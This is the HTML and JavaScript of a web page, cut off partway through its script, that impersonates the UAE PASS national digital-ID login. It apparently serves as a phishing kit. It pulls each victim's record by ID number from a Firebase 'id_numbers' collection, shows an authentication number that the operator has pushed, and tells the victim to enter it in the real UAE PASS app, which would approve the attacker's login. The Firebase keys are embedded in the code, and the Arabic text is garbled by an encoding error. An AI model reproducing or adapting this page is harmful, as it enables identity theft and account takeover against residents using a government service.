<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
    
    <!-- Bootstrap CSS Ù…Ù† CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="firebase-config.js?v=12"></script>
    
    <title>UAE PASS - ØªÙ…Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­</title>
    
    <style>
        /* CSS Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ */
        body, html {
            font-family: 'Dubai', 'Roboto', sans-serif !important;
            background: #F9F9FB;
            margin: 0;
            padding: 0;
            height: 100%;
        }
        
        .main-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .flex {
            display: flex;
        }

        .login-container {
            max-width: 1280px;
            margin: auto;
            flex: 0 0 100%;
        }

        .login-container-fluid {
            max-width: 100%;
            height: 100%;
        }

        .header {
            background: #fff;
            height: 64px;
            padding: 16px 0px;
        }

        .header-title {
            color: #1B1B1F;
            font-style: normal;
            font-weight: 300;
            line-height: 32px;
            font-size: 22px;
            padding: 0px 16px;
        }

        /* Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
        #loadingScreen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 40px 20px;
            background: #F9F9FB;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 9999;
        }
        
        .card {
            margin: 48px 0px 10px 0px;
        }

        .card-info {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-clip: border-box;
            border-radius: 0.25rem;
            margin: 48px 0px 10px 0px;
            border: 0px !important;
        }

        .card.login {
            padding: 48px;
            margin: 48px 0px 10px 0px;
            border: 1.6px solid transparent;
            border-radius: 19px;
            background-image: linear-gradient(to right bottom, white, white), radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);
            background-origin: border-box;
            background-clip: padding-box, border-box;
        }

        .card.login .card-header {
            display: flex;
            justify-content: space-between;
            background: white;
            border: 0;
            padding: 0px;
        }

        .card.login .card-content {
            display: flex;
            flex-direction: row;
            flex-grow: 1;
            justify-content: space-between;
        }

        .card.login .card-content .card-content-left {
            max-width: 70%;
            padding-right: 40px;
        }

        .login-pin-image {
            max-width: 400px;
            width: 100%;
        }

        .info-title {
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
        }

        .info-app-name {
            font-size: 16px;
            font-style: normal;
            font-weight: 400;
            padding: 32px 0px;
        }

        .info-description {
            font-size: 28px;
            font-style: normal;
            font-weight: 400;
            line-height: 36px;
            max-width: 500px;
        }

        @keyframes spin {
            from {transform: translate(-50%, -50%) rotate(0);}
            to   {transform: translate(-50%, -50%) rotate(360deg);}
        }

        .passcode-card {
            color: #454F63;
            width: 120px;
            height: 120px;
            margin: 30px auto;
            position: relative;
            overflow: hidden;
            border-radius: 20px;
            display: inline-block;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        .passcode-card::before {
            content: '';
            display: block;
            background: conic-gradient(
                #fff 0.0turn 0.125turn,
                #fff 0.125turn 0.25turn,
                #fff 0.25turn 0.375turn,
                #fff 0.375turn 0.5turn,
                #fff 0.5turn 0.625turn,
                #fff 0.625turn 0.75turn,
                #00ac75 0.75turn 0.875turn,
                #00ac75 0.875turn 1.0turn
            );
            width: calc(100% * 1.41421356237);
            padding-bottom: calc(100% * 1.41421356237);
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            border-radius: 100%;
            animation: spin 5s linear infinite;
        }

        .passcode-card::after {
            content: attr(data-after-content);
            position: absolute;
            inset: 0.15rem;
            background: #ECF3EC;
            border-radius: 0.85rem;
            font-size: 62px;
            font-style: normal;
            font-weight: 700;
            text-align: center;
            line-height: 120px;
            color: #1B1B1F;
        }

        .uaepass-logo {
            width: 32px;
            object-fit: contain;
            height: 32px;
            padding: 6px
        }

        .uaepass-text-logo {
            display: flex;
            height: 41px;
            justify-content: center;
            align-items: center;
        }

        .timer-img {
            width: 25px;
            height: 20px;
            padding: 1.667px 5.149px 2.415px 4.706px;
            justify-content: center;
            align-items: center;
        }

        .waiting-confirmation {
            color: #C78200;
            font-family: Roboto;
            font-size: 18px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            padding-top: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .cancel-request {
            color: #FF5545;
            border: 0;
            background: transparent;
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
            line-height: 24px;
            cursor: pointer;
        }

        .cancel-request:after {
            display: inline-block;
            content: "\00d7";
            font-size: 28px;
            padding: 10px 0px;
            font-weight: 400;
        }

        .polling-footer {
            position: relative;
            width: 100%;
            margin-top: 40px;
        }

        .ids-logo {
            width: 13px;
            height: 13px;
            object-fit: contain;
            position: absolute;
            margin-bottom: 1em;
            margin-left: 5px;
        }

        .poweredby {
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.5;
            text-align: center;
            color: #454f63;
        }

        /* ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© */
        .passcode-info {
            margin-top: 20px;
            font-size: 16px;
            color: #666;
            text-align: center;
        }
        
        .main-content {
            display: none;
        }
        
        .connection-status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            z-index: 10000;
        }
        
        .success-message {
            color: #00ac75;
            font-size: 22px;
            font-weight: 600;
            margin: 20px 0;
            text-align: center;
        }
        
        .auth-number-display {
            font-size: 3em;
            color: #1B1B1F;
            font-weight: 700;
            margin: 30px 0;
            padding: 20px;
            background: #f8fff8;
            border: 2px solid #00ac75;
            border-radius: 15px;
            text-align: center;
        }
        
        .instructions {
            background: #f0f9f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 14px;
            color: #555;
        }
        
        .action-buttons {
            margin-top: 30px;
            text-align: center;
        }
        
        .btn-success {
            background: #00ac75;
            border-color: #00ac75;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: 600;
        }
        
        .btn-success:hover {
            background: #009966;
            border-color: #009966;
        }

        /* CSS Ù„Ù„Ø¥Ø¸Ù‡Ø§Ø± ÙˆØ§Ù„Ø¥Ø®ÙØ§Ø¡ Ø­Ø³Ø¨ Ø­Ø¬Ù… Ø§Ù„Ø´Ø§Ø´Ø© */
        @media only screen and (min-width: 601px) {
            .cancel-request-mobile,
            .card-content-right-mobile {
                display: none !important;
            }
            
            .card-content-right {
                display: block !important;
            }
            
            .cancel-request-div {
                display: block !important;
            }
        }

        @media only screen and (max-width: 600px) {
            .cancel-request-mobile {
                display: block !important;
                margin-top: 10px;
            }
            
            .card-content-right-mobile {
                display: block !important;
            }
            
            .card-content-right {
                display: none !important;
            }
            
            .cancel-request-div {
                display: none !important;
            }
            
            .card-content-right-mobile {
                margin-bottom: 30px;
                text-align: center;
            }
            
            .login-pin-image {
                max-width: 200px !important;
            }
            
            .card.login {
                padding: 20px;
            }
            
            .info-description {
                font-size: 18px;
                line-height: 1.5;
            }
            
            .passcode-card {
                width: 100px;
                height: 100px;
            }
            
            .passcode-card::after {
                font-size: 48px;
                line-height: 100px;
            }
            
            .auth-number-display {
                font-size: 2em;
                padding: 15px;
            }
        }

        /* Ø´Ø±ÙŠØ· ØªÙ‚Ø¯Ù… */
        .progress-container {
            width: 100%;
            max-width: 300px;
            background-color: #eee;
            border-radius: 5px;
            margin: 20px auto;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 6px;
            background-color: #00ac75;
            width: 0%;
            transition: width 0.3s;
        }
        
        .progress-text {
            margin-top: 5px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <!-- Ø­Ø§Ù„Ø© Ø§Ù„Ø§ØªØµØ§Ù„ -->
    <div class="connection-status" id="connectionStatus">
        <i class="fas fa-circle-notch fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„...
    </div>
    
    <div class="main-container">
        <!-- Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ -->
        <div id="loadingScreen">
            <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
                <i class="fas fa-spinner fa-spin"></i>
            </div>
            <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">Ø¬Ø§Ø±ÙŠ ØªØ­Ø¶ÙŠØ± Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©</h2>
            <p style="color: #78849e;" id="loadingMessage">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
            
            <div id="firebaseStatus" style="margin-top: 20px; font-size: 14px; color: #666;">
                <i class="fas fa-cloud"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§ØªØµØ§Ù„ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...
            </div>
            
            <div id="errorMessage" style="margin-top: 20px; color: #ff4757; display: none;">
                <i class="fas fa-exclamation-circle"></i> <span id="errorText"></span>
            </div>
        </div>
        
        <!-- Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
        <div class="main-content" id="mainContent">
            <!-- Header Section -->
            <div class="header-section">
                <div class="login-container-fluid header">
                    <div class="login-container flex">
                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
                        <div class="header-title">ØªÙ…Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­</div>
                    </div>
                </div>
            </div>

            <!-- Main Content -->
            <div class="login-container-fluid">
                <div class="login-container">
                    <div class="card login">
                        <div class="card-header">
                            <div>
                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
                            </div>
                        </div>
                        
                        <div class="card-content">
                            <!-- Left Content -->
                            <div class="card-content-left">
                                <div class="card-info">
                                    <div class="info-title">
                                        Ø·Ù„Ø¨ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù…Ù†
                                    </div>
                                    <div class="info-app-name">Self Service Portal</div>

                                    <!-- Mobile Image -->
                                    <div class="card-content-right-mobile">
                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                                    </div>

                                    <div class="info-description">
                                        <span>ØªÙ…Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø·Ù„Ø¨ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­</span>
                                    </div>
                                    
                                    <!-- Success Message -->
                                    <div class="success-message" id="successMessage">
                                        <i class="fas fa-check-circle"></i> ØªÙ…Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­!
                                    </div>
                                    
                                    <!-- Passcode Display -->
                                    <div class="card-info">
                                        <div class="passcode-card" data-after-content="00" aria-label="Ø§Ù„Ø±Ù…Ø²" id="passcodeDisplay"></div>
                                        <div class="passcode-info" id="passcodeInfo">
                                            <div>Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ</div>
                                            <div class="auth-number-display" id="authNumberDisplay">--</div>
                                            <div style="color: #777; font-size: 14px; margin-top: 10px;">
                                                <i class="fas fa-clock"></i> ØµØ§Ù„Ø­ Ù„Ù…Ø¯Ø© 5 Ø¯Ù‚Ø§Ø¦Ù‚
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Instructions -->
                                    <div class="instructions" id="instructions">
                                        <p><i class="fas fa-info-circle"></i> <strong>ØªØ¹Ù„ÙŠÙ…Ø§Øª Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…:</strong></p>
                                        <ol style="margin: 10px 0 0 20px; text-align: right;">
                                            <li>Ø§ÙØªØ­ ØªØ·Ø¨ÙŠÙ‚ UAE PASS Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø²Ùƒ Ø§Ù„Ù…Ø­Ù…ÙˆÙ„</li>
                                            <li>Ø§Ø¯Ø®Ù„ Ù‡Ø°Ø§ Ø§Ù„Ø±Ù‚Ù… ÙÙŠ Ø­Ù‚Ù„ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©</li>
                                            <li>Ø§ØªØ¨Ø¹ Ø§Ù„ØªØ¹Ù„ÙŠÙ…Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ© ÙÙŠ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</li>
                                            <li>Ø³ÙˆÙ ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù…</li>
                                        </ol>
                                    </div>
                                    
                                    <!-- Action Buttons -->
                                    <div class="action-buttons">
                                        <button class="btn btn-success" onclick="copyAuthNumber()">
                                            <i class="fas fa-copy"></i> Ù†Ø³Ø® Ø§Ù„Ø±Ù‚Ù…
                                        </button>
                                        <button class="btn btn-outline-secondary" onclick="window.location.reload()" style="margin-right: 10px;">
                                            <i class="fas fa-redo"></i> ØªØ­Ø¯ÙŠØ«
                                        </button>
                                        <a href="apply.html" class="btn btn-outline-primary">
                                            <i class="fas fa-home"></i> Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
                                        </a>
                                    </div>
                                    
                                    <!-- Status Info -->
                                    <div id="statusInfo" style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 10px; display: none;">
                                        <p style="margin: 0; color: #555; font-size: 14px;">
                                            <i class="fas fa-database"></i> 
                                            <span id="dataSource">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</span> | 
                                            <span id="lastUpdate">--:--</span>
                                        </p>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Desktop Image -->
                            <div class="card-content-right">
                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                            </div>
                        </div>
                    </div>
                    
                    <!-- Footer -->
                    <div class="polling-footer">
                        <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
                        <p class="poweredby"> Powered by UAE PASS </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script type="text/javascript">
        // ========== Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… ==========
        let firebaseInitialized = false;
        let firestoreDb = null;
        let currentRecordId = null;
        let currentAuthNumber = null;
        let checkInterval = null;
        let realtimeListener = null;
        const urlParams = new URLSearchParams(window.location.search);
        
        // ========== Ø¯ÙˆØ§Ù„ Ø§Ù„ØªÙ‚Ø¯Ù… ==========
        function updateProgress(percent, message) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('progressText').textContent = percent + '%';
            if (message) {
                document.getElementById('loadingMessage').textContent = message;
            }
        }
        
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');
            errorText.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function hideError() {
            document.getElementById('errorMessage').style.display = 'none';
        }
        
        function updateConnectionStatus(status, message = '') {
            const statusElement = document.getElementById('connectionStatus');
            
            switch(status) {
                case 'Ù…ØªØµÙ„':
                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #00ac75;"></i> Ù…ØªØµÙ„';
                    break;
                case 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„':
                    statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„...';
                    break;
                case 'Ø®Ø·Ø£':
                    statusElement.innerHTML = '<i class="fas fa-circle" style="color: #ff4757;"></i> Ø®Ø·Ø£';
                    break;
                default:
                    statusElement.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„...';
            }
        }
        
        // ========== ØªÙ‡ÙŠØ¦Ø© Firebase ==========
        async function initializeFirebaseForSuccess() {
            updateProgress(20, 'Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
            updateConnectionStatus('Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„');
            
            try {
                // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 1: Ø§Ø³ØªØ®Ø¯Ø§Ù… initializeFirebase Ù…Ù† firebase-config.js
                if (typeof initializeFirebase === 'function') {
                    firebaseInitialized = initializeFirebase();
                } 
                // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 2: Ø§Ø³ØªØ®Ø¯Ø§Ù… firebaseServices
                else if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
                    firebaseInitialized = window.firebaseServices.initialize();
                }
                // Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© 3: Ø§Ù„ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
                else if (typeof firebase !== 'undefined') {
                    if (!firebase.apps || firebase.apps.length === 0) {
                        firebase.initializeApp(window.firebaseConfig || {
                            apiKey: "AIzaSyAk27c6KL77QbnXa_bNeWzUsBph5o7I9A8",
                            authDomain: "uaewep-ce954.firebaseapp.com",
                            databaseURL: "https://uaewep-ce954-default-rtdb.firebaseio.com",
                            projectId: "uaewep-ce954",
                            storageBucket: "uaewep-ce954.firebasestorage.app",
                            messagingSenderId: "679277016812",
                            appId: "1:679277016812:web:ab78a6d55b4a153b8a97c9",
                            measurementId: "G-NE9HXPPM9P"
                        });
                    }
                    firebaseInitialized = true;
                }
                
                if (firebaseInitialized) {
                    // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Firestore
                    firestoreDb = window.firebaseDb || 
                                (window.firebaseServices ? window.firebaseServices.db() : null);
                    
                    // Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† Ù…ØªØ§Ø­Ø©ØŒ Ø­Ø§ÙˆÙ„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„ÙŠÙ‡Ø§ Ù…Ø¨Ø§Ø´Ø±Ø©
                    if (!firestoreDb && typeof firebase !== 'undefined' && firebase.firestore) {
                        firestoreDb = firebase.firestore();
                    }
                    
                    updateProgress(40, 'ØªÙ… ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                    updateConnectionStatus('Ù…ØªØµÙ„');
                    console.log('âœ… Firebase Ù…Ù‡ÙŠØ¦ Ù„ØµÙØ­Ø© success');
                    console.log('ğŸ“¡ Firestore DB:', !!firestoreDb);
                    
                    return true;
                }
                
                updateProgress(30, 'Ù„Ù… ÙŠØªÙ… ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                updateConnectionStatus('Ø®Ø·Ø£', 'Firebase ØºÙŠØ± Ù…Ù‡ÙŠØ¦');
                showError('ØªØ¹Ø°Ø± Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø§Ø­Ù‚Ø§Ù‹.');
                return false;
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Firebase:', error);
                updateProgress(30, 'Ø®Ø·Ø£ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                updateConnectionStatus('Ø®Ø·Ø£', error.message);
                showError('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ' + error.message);
                return false;
            }
        }
        
        // ========== Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ø±Ù Ø§Ù„Ø³Ø¬Ù„ Ù…Ù† URL ==========
        function getRecordIdFromURL() {
            const recordId = urlParams.get('recordId');
            const authNumber = urlParams.get('authNumber');
            
            if (recordId) {
                currentRecordId = recordId;
                localStorage.setItem('currentRecordId', recordId);
            } else {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ù…Ù† localStorage
                currentRecordId = localStorage.getItem('currentRecordId');
            }
            
            if (authNumber) {
                currentAuthNumber = authNumber;
                localStorage.setItem('currentAuthNumber', authNumber);
            }
            
            console.log('ğŸ“‹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª URL:', { recordId, authNumber, fromStorage: currentRecordId });
            return { recordId: currentRecordId, authNumber: currentAuthNumber };
        }
        
        // ========== Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³Ø¬Ù„ ÙÙŠ Firestore ==========
        async function findAuthRecord(recordId) {
            if (!firestoreDb) {
                throw new Error('Firestore ØºÙŠØ± Ù…ØªØ§Ø­');
            }
            
            try {
                console.log('ğŸ” Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³Ø¬Ù„:', recordId);
                const docRef = firestoreDb.collection('id_numbers').doc(recordId);
                const docSnap = await docRef.get();
                
                if (docSnap.exists) {
                    const data = docSnap.data();
                    console.log('âœ… ÙˆØ¬Ø¯Øª Ø§Ù„Ø³Ø¬Ù„:', data);
                    
                    // ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ù‡Ù†Ø§Ùƒ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø©
                    if (data.authNumber && data.authNumber !== null && data.waiting === false) {
                        return {
                            found: true,
                            recordId: recordId,
                            data: data,
                            source: 'firestore'
                        };
                    } else {
                        return {
                            found: false,
                            reason: 'no_auth_number',
                            data: data
                        };
                    }
                } else {
                    console.log('âŒ Ø§Ù„Ø³Ø¬Ù„ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯:', recordId);
                    return {
                        found: false,
                        reason: 'not_found'
                    };
                }
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³Ø¬Ù„:', error);
                throw error;
            }
        }
        
        // ========== Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø¨Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ© ==========
        async function searchByIdNumber(idNumber) {
            if (!firestoreDb) {
                throw new Error('Firestore ØºÙŠØ± Ù…ØªØ§Ø­');
            }
            
            try {
                console.log('ğŸ” Ø§Ù„Ø¨Ø­Ø« Ø¨Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©:', idNumber);
                
                const querySnapshot = await firestoreDb.collection('id_numbers')
                    .where('idNumber', '==', idNumber)
                    .orderBy('timestamp', 'desc')
                    .limit(5)
                    .get();
                
                if (!querySnapshot.empty) {
                    for (const doc of querySnapshot.docs) {
                        const data = doc.data();
                        if (data.authNumber && data.authNumber !== null && data.waiting === false) {
                            console.log('âœ… ÙˆØ¬Ø¯Øª Ø³Ø¬Ù„Ø§Ù‹ Ù…ÙƒØªÙ…Ù„Ø§Ù‹:', doc.id);
                            return {
                                found: true,
                                recordId: doc.id,
                                data: data,
                                source: 'search_by_id'
                            };
                        }
                    }
                }
                
                return {
                    found: false,
                    reason: 'no_completed_records'
                };
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø­Ø« Ø¨Ø±Ù‚Ù… Ø§Ù„Ù‡ÙˆÙŠØ©:', error);
                throw error;
            }
        }
        
        // ========== Ø¹Ø±Ø¶ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© ==========
        function displayAuthNumber(authNumber, source = 'firestore') {
            try {
                // ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø±Ù‚Ù… (Ø¥Ø¶Ø§ÙØ© ØµÙØ± Ø£Ù…Ø§Ù… Ø§Ù„Ø±Ù‚Ù… Ø¥Ø°Ø§ ÙƒØ§Ù† Ø£Ù‚Ù„ Ù…Ù† 10)
                const formattedNumber = authNumber < 10 ? '0' + authNumber : authNumber.toString();
                
                // ØªØ­Ø¯ÙŠØ« passcode card
                const passcodeCard = document.getElementById('passcodeDisplay');
                if (passcodeCard) {
                    passcodeCard.setAttribute('data-after-content', formattedNumber);
                    
                    // Ø¥Ø¶Ø§ÙØ© ØªØ£Ø«ÙŠØ±
                    passcodeCard.style.transform = 'scale(1.1)';
                    setTimeout(() => {
                        passcodeCard.style.transform = 'scale(1)';
                    }, 300);
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø¹Ø±Ø¶ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙƒØ¨ÙŠØ±
                const authNumberDisplay = document.getElementById('authNumberDisplay');
                if (authNumberDisplay) {
                    authNumberDisplay.textContent = authNumber;
                    authNumberDisplay.style.color = '#00ac75';
                }
                
                // ØªØ­Ø¯ÙŠØ« Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØµØ¯Ø±
                const dataSource = document.getElementById('dataSource');
                if (dataSource) {
                    dataSource.textContent = `Ø§Ù„Ù…ØµØ¯Ø±: ${source}`;
                }
                
                // ØªØ­Ø¯ÙŠØ« ÙˆÙ‚Øª Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«
                const lastUpdate = document.getElementById('lastUpdate');
                if (lastUpdate) {
                    const now = new Date();
                    lastUpdate.textContent = `Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«: ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
                }
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ù‚Ø³Ù… Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
                const statusInfo = document.getElementById('statusInfo');
                if (statusInfo) {
                    statusInfo.style.display = 'block';
                }
                
                console.log('âœ… ØªÙ… Ø¹Ø±Ø¶ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©:', authNumber, 'Ù…Ù†:', source);
                return true;
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¹Ø±Ø¶ Ø±Ù‚Ù… Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©:', error);
                return false;
            }
        }
        
        // ========== Ù†Ø³Ø® Ø§Ù„Ø±Ù‚Ù… Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø© ==========
        function copyAuthNumber() {
            if (!currentAuthNumber) {
                alert('Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø±Ù‚Ù… Ù…ØµØ§Ø¯Ù‚Ø© Ù„Ù„Ù†Ø³Ø®');
                return;
            }
            
            navigator.clipboard.writeText(currentAuthNumber.toString())
                .then(() => {
                    // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ù†Ø¬Ø§Ø­
                    const originalText = document.querySelector('.btn-success').innerHTML;
                    document.querySelector('.btn-success').innerHTML = '<i class="fas fa-check"></i> ØªÙ… Ø§Ù„Ù†Ø³Ø®';
                    document.querySelector('.btn-success').style.backgroundColor = '#28a745';
                    
